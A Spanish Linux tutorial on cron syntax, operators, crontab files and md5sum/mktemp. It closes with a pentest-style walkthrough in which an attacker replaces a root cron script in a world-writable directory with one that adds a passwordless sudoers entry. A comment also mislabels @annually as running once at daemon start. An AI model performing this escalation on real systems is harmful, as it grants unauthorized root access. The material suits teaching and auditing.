# Cron: Programación de Tareas en Linux

## Introducción

Cron es el demonio (proceso en segundo plano) encargado de la programación y ejecución automática de tareas en sistemas Unix y Linux, permitiendo que un comando o script se ejecute de forma recurrente según una periodicidad definida por el administrador, sin necesidad de intervención manual. Su presencia es prácticamente universal en cualquier sistema Linux, ya que tanto el propio sistema operativo como innumerables aplicaciones y servicios instalados dependen de él para tareas rutinarias como la rotación de logs, la actualización de bases de datos de paquetes, la ejecución de copias de seguridad periódicas, o la limpieza de archivos temporales. La interacción con cron por parte del usuario o administrador se realiza principalmente a través del comando `crontab` (_cron table_), que permite crear, editar, listar y eliminar las tareas programadas de un usuario determinado.

## Sintaxis del formato cron

Cada línea de una tabla cron sigue una estructura de seis campos separados por espacios: los primeros cinco definen exactamente en qué momento debe ejecutarse la tarea, y el sexto es el comando o script que se desea ejecutar en ese momento.

```
Minuto  Hora  Día-del-Mes  Mes  Día-de-la-Semana  Comando-a-Ejecutar
  0-59   0-23      1-31    1-12       0-7
```

Es importante señalar, respecto al campo de día de la semana, una particularidad histórica del estándar: los valores admitidos van de `0` a `7`, donde tanto el `0` como el `7` representan el domingo (una redundancia heredada de distintas convenciones que coexistieron en implementaciones antiguas de cron y que se mantuvo por compatibilidad), mientras que el `1` representa el lunes y así sucesivamente hasta el `6`, que representa el sábado.

## El asterisco y otros operadores de selección de valores

El operador más básico y el que primero se aprende al trabajar con cron es el asterisco (`*`), que en cualquiera de los cinco campos de tiempo significa "cualquier valor válido para este campo", es decir, que ese campo concreto no impone ninguna restricción sobre cuándo debe ejecutarse la tarea.

```bash
# Se ejecuta cada minuto de cada hora de cada día, sin excepción
* * * * * /home/user/script.sh
```

Más allá del asterisco solo, cron admite varios operadores adicionales que permiten expresar patrones de tiempo considerablemente más ricos y específicos sin necesidad de crear múltiples líneas separadas para lograr el mismo efecto.

### Valores exactos (números sueltos)

El uso más simple, más allá del asterisco, es especificar directamente un número concreto en el campo correspondiente, restringiendo la ejecución únicamente a ese valor exacto.

```bash
# Se ejecuta exactamente a las 03:30 (minuto 30 de la hora 3),
# todos los días, de todos los meses, sin importar el día
# de la semana
30 3 * * * /home/user/backup.sh
```

### Listas separadas por comas (,)

Cuando se necesita que una tarea se ejecute en varios valores específicos y no consecutivos dentro de un mismo campo, se utiliza una lista de valores separados por comas.

```bash
# Se ejecuta a las 08:00, 12:00 y 18:00 de cada día
0 8,12,18 * * * /home/user/notificacion.sh

# Se ejecuta únicamente los lunes, miércoles y viernes,
# a las 09:00
0 9 * * 1,3,5 /home/user/reporte_semanal.sh
```

### Rangos con guion (-)

Cuando el conjunto de valores deseado es un intervalo continuo de números consecutivos, resulta más claro y compacto expresarlo como un rango mediante un guion entre el valor inicial y el valor final, en lugar de enumerar cada uno de forma individual con comas.

```bash
# Se ejecuta cada minuto, pero solo durante el rango
# de horas de 9 a 17 (jornada laboral), de lunes a viernes
* 9-17 * * 1-5 /home/user/monitor_horario.sh

# Se ejecuta a las 00:00 del día 1 al día 5 de cada mes
0 0 1-5 * * /home/user/tarea_inicio_mes.sh
```

### Incrementos o "pasos" con barra (/)

El operador de barra (`/`) permite expresar un incremento o paso dentro de un rango de valores (o dentro del rango completo cuando se combina con el asterisco), evitando así tener que enumerar manualmente cada valor de un patrón repetitivo. Esta es, en la práctica, una de las combinaciones más utilizadas en tareas cron reales, ya que permite expresar de forma muy compacta patrones como "cada 5 minutos" o "cada 2 horas".

```bash
# Se ejecuta cada 5 minutos (en los minutos 0, 5, 10, 15... 55)
*/5 * * * * /home/user/chequeo_rapido.sh

# Se ejecuta cada 2 horas en punto (00:00, 02:00, 04:00...)
0 */2 * * * /home/user/sincronizacion.sh

# El paso también puede aplicarse sobre un rango explícito
# en lugar de sobre el rango completo: aquí se ejecuta
# cada 2 horas, pero únicamente dentro del rango de 8 a 18
0 8-18/2 * * * /home/user/tarea_horario_reducido.sh
```

### Combinación de todos los operadores

Estos operadores no son mutuamente excluyentes y pueden combinarse libremente entre distintos campos de una misma línea, e incluso, en cierta medida, dentro de un mismo campo (como se vio con el rango combinado con paso), lo cual permite construir patrones de programación tan específicos como sea necesario.

```bash
# Se ejecuta a los minutos 0 y 30, entre las 9 y las 17,
# de lunes a viernes: una comprobación cada media hora,
# pero solo durante el horario laboral de días hábiles
0,30 9-17 * * 1-5 /home/user/chequeo_laboral.sh
```

## Cadenas especiales (shortcuts)

Además de la sintaxis de cinco campos, cron admite un conjunto de cadenas especiales predefinidas que sustituyen a los cinco campos completos por una palabra clave con un significado ya establecido, resultando más legibles para patrones de uso extremadamente común.

```bash
# Ejecuta la tarea una única vez, en el momento en que
# el sistema arranca o se reinicia; muy utilizado para
# levantar servicios o scripts de inicialización propios
@reboot /home/user/script_inicio.sh

# Equivalente a "0 0 * * *": una vez al día, a medianoche
@daily /home/user/tarea_diaria.sh

# Equivalente a "0 0 * * 0": una vez a la semana,
# el domingo a medianoche
@weekly /home/user/tarea_semanal.sh

# Equivalente a "0 0 1 * *": una vez al mes,
# el primer día del mes a medianoche
@monthly /home/user/tarea_mensual.sh

# Equivalente a "0 0 1 1 *": una vez al año,
# el 1 de enero a medianoche
@yearly /home/user/tarea_anual.sh

# Ejecuta la tarea una única vez, tan pronto como el propio
# demonio cron se inicia (distinto de @reboot, que se dispara
# al arrancar el SISTEMA; @yearly y @annually son sinónimos
# exactos entre sí)
@annually /home/user/tarea_anual.sh
```

## El comando crontab

La interacción habitual con las tareas programadas de un usuario se realiza mediante el comando `crontab`, que gestiona un archivo de configuración propio por cada usuario del sistema, almacenado internamente (aunque no debe editarse directamente ahí) en `/var/spool/cron/crontabs/<usuario>`.

```bash
# Abre el editor de texto por defecto para editar
# las tareas cron del usuario actual
crontab -e

# Lista las tareas cron actualmente configuradas
# para el usuario actual, sin abrir el editor
crontab -l

# Elimina TODAS las tareas cron del usuario actual
crontab -r

# Un usuario con privilegios de root puede consultar
# o editar el crontab de cualquier otro usuario del sistema
# especificando explícitamente su nombre con -u
sudo crontab -u pepe -l
sudo crontab -u pepe -e
```

## Dónde viven realmente las tareas cron

No todas las tareas cron del sistema residen en `/etc/cron.d`; en realidad existen varias ubicaciones distintas donde cron busca tareas programadas, cada una pensada para un propósito ligeramente distinto, y conocerlas todas es importante tanto para la administración del sistema como para una enumeración exhaustiva durante un pentest.

El archivo `/etc/crontab` es el crontab del propio sistema, editado directamente por el administrador con privilegios de `root`, y se diferencia de los crontabs de usuario en que cada línea incluye un campo adicional, entre los campos de tiempo y el comando, que especifica explícitamente con qué usuario debe ejecutarse esa tarea concreta.

```bash
# Formato de /etc/crontab: incluye un campo de USUARIO adicional
# que no existe en los crontabs individuales de cada usuario
# Minuto Hora Dia-Mes Mes Dia-Semana USUARIO Comando
0 5 * * * root /usr/local/bin/backup_completo.sh
```

El directorio `/etc/cron.d/` contiene archivos individuales, cada uno con el mismo formato de seis campos que `/etc/crontab` (incluyendo el campo de usuario), y es el mecanismo preferido por los paquetes de software instalados en el sistema para añadir sus propias tareas programadas de forma independiente, sin tener que modificar directamente el archivo `/etc/crontab` central. Adicionalmente, existen los directorios `/etc/cron.hourly/`, `/etc/cron.daily/`, `/etc/cron.weekly/` y `/etc/cron.monthly/`, cuyo funcionamiento es distinto: en lugar de contener archivos con sintaxis cron, contienen directamente scripts ejecutables, y es el propio `/etc/crontab` (mediante una entrada que invoca la utilidad `run-parts`) el que se encarga de ejecutar, con la periodicidad indicada por el nombre del directorio, todos los scripts que encuentre dentro de cada uno de ellos.

```bash
# Enumeración típica de todas las ubicaciones de tareas
# cron del sistema durante una auditoría o un pentest
cat /etc/crontab
ls -la /etc/cron.d/
cat /etc/cron.d/*
ls -la /etc/cron.hourly/ /etc/cron.daily/ /etc/cron.weekly/ /etc/cron.monthly/
crontab -l                     # Tareas del usuario actual
sudo crontab -l -u root        # Tareas de root, si se tienen privilegios
```

Finalmente, `/etc/cron.allow` y `/etc/cron.deny` son dos archivos opcionales de control de acceso que determinan qué usuarios del sistema tienen permitido (o explícitamente prohibido) usar `crontab` para gestionar sus propias tareas: si existe `/etc/cron.allow`, únicamente los usuarios listados en él pueden usar `crontab`; si no existe pero sí existe `/etc/cron.deny`, todos los usuarios pueden usar `crontab` excepto los listados en ese archivo; y si ninguno de los dos existe, el comportamiento por defecto (que varía según la distribución) suele ser permitir su uso a todos los usuarios del sistema.

## md5sum: verificación de integridad

Aunque no es una herramienta propia de cron, `md5sum` resulta un complemento natural al hablar de tareas programadas y de seguridad de scripts, ya que permite generar un hash criptográfico (una "huella digital" de longitud fija) a partir del contenido de un archivo, utilizando el algoritmo MD5. Dos archivos con contenido idéntico producirán siempre exactamente el mismo hash, mientras que cualquier modificación en el contenido del archivo, por mínima que sea (incluso un solo carácter), produce un hash completamente distinto. Esto convierte a `md5sum` en una herramienta útil para verificar que un archivo no ha sido alterado respecto a una versión de referencia conocida, algo especialmente relevante para scripts que se ejecutan automáticamente sin supervisión, como es precisamente el caso de los scripts invocados por tareas cron.

```bash
# Genera el hash MD5 de un script
md5sum /home/user/script.sh
# a1b2c3d4e5f6... /home/user/script.sh

# Compara el hash actual de un archivo contra un valor
# de referencia conocido y confiable, para detectar
# si el archivo fue modificado desde la última verificación
echo "a1b2c3d4e5f6...  /home/user/script.sh" | md5sum -c -
```

> **Nota de seguridad:** MD5 se considera criptográficamente roto para fines de seguridad (resistencia a colisiones intencionales), por lo que no debería utilizarse como mecanismo de protección contra manipulaciones deliberadas y sofisticadas; para ese propósito son preferibles SHA-256 (`sha256sum`) o algoritmos superiores. Sin embargo, para el propósito mucho más modesto de detectar cambios accidentales o no sofisticados en un archivo (que es su uso más habitual en tareas de administración cotidiana), sigue siendo perfectamente funcional.

## mktemp: directorios temporales para pruebas

Otra utilidad complementaria, especialmente útil al experimentar con scripts que serán invocados por cron (donde conviene probar su comportamiento en un entorno aislado antes de programarlos para ejecución automática desatendida), es `mktemp`, que crea de forma segura un archivo o directorio temporal con un nombre garantizado como único, evitando colisiones con archivos ya existentes y reduciendo el riesgo de ciertos ataques basados en predecir nombres de archivos temporales.

```bash
# Crea un directorio temporal con un nombre único
# y devuelve su ruta completa
mktemp -d
# /tmp/tmp.XXXXXXXXXX

# Uso típico: capturar la ruta en una variable
# para trabajar dentro de ese directorio de pruebas
DIR_PRUEBA=$(mktemp -d)
cd "$DIR_PRUEBA"
```

## Implicaciones de seguridad: cron como vector de escalada de privilegios

Las tareas cron mal configuradas constituyen uno de los vectores de escalada de privilegios más citados y más frecuentemente encontrados en la práctica dentro de máquinas Linux vulnerables, sea en entornos de CTF o en sistemas reales insuficientemente auditados. El principio general es el mismo que ya se vio al hablar de binarios SUID: si una tarea programada se ejecuta con los privilegios de un usuario con más permisos que el atacante (típicamente `root`, ya que es extremadamente común que tareas administrativas de mantenimiento corran bajo esa cuenta), y dicha tarea interactúa de alguna manera con un recurso (un archivo, un script, un directorio) sobre el que el atacante tiene capacidad de escritura, entonces el atacante puede manipular ese recurso para que la tarea, en su próxima ejecución automática, termine ejecutando código elegido por el atacante con los privilegios de la cuenta bajo la que corre la tarea.

Conviene reconstruir este escenario con un ejemplo concreto y completo, con todos los pasos que seguiría un pentester durante la fase de enumeración y explotación, para ilustrar bien por qué esto es tan peligroso en la práctica. Supongamos que, durante la enumeración de tareas cron del sistema, se descubre la siguiente entrada dentro de `/etc/crontab`:

```bash
cat /etc/crontab
# ...
* * * * * root /opt/scripts/mantenimiento.sh
```

Esta línea indica que, cada minuto, el sistema ejecuta el script `/opt/scripts/mantenimiento.sh` con privilegios de `root`, sin importar quién sea el usuario que inició sesión en ese momento; la tarea corre de forma completamente autónoma bajo la cuenta especificada en el propio archivo de configuración. El siguiente paso del pentester consiste en comprobar los permisos concretos de ese script y, muy especialmente, los del directorio que lo contiene, ya que un permiso de escritura sobre el directorio contenedor puede resultar tan explotable como un permiso de escritura sobre el propio archivo, incluso si el archivo en sí estuviera correctamente protegido.

```bash
ls -la /opt/scripts/
# drwxrwxrwx  2 root root  4096 jul 14 10:00 .
# -rwxr-xr-x  1 root root   150 jul 14 10:00 mantenimiento.sh
```

En este ejemplo concreto, el propio archivo `mantenimiento.sh` tiene permisos razonables (`rwxr-xr-x`, sin escritura para otros), pero el **directorio** que lo contiene tiene permisos `rwxrwxrwx`, es decir, cualquier usuario del sistema puede escribir dentro de ese directorio. Dado que en Linux la capacidad de eliminar o reemplazar un archivo depende de los permisos del directorio que lo contiene y no únicamente de los permisos del propio archivo, un usuario sin privilegios puede eliminar el script original y sustituirlo por uno propio con el mismo nombre, incluso sin tener permiso directo de escritura sobre el archivo original.

```bash
# El atacante elimina el script legítimo (permitido, ya que
# tiene escritura sobre el directorio que lo contiene)
rm /opt/scripts/mantenimiento.sh

# Y coloca en su lugar un script propio con el mismo nombre,
# que añade una entrada de sudo sin contraseña para su propio
# usuario, otorgándole privilegios administrativos completos
cat << 'EOF' > /opt/scripts/mantenimiento.sh
#!/bin/bash
echo "fnieto ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
EOF

# Se asegura de que el script conserve permiso de ejecución
chmod +x /opt/scripts/mantenimiento.sh

# Basta con esperar como máximo un minuto (dado el "* * * * *"
# de la tarea) a que cron ejecute automáticamente el script,
# ahora sustituido, con privilegios de root
sleep 61

# A partir de este momento, el usuario puede usar sudo
# sin contraseña, habiendo escalado privilegios por completo
sudo -l
sudo su
```
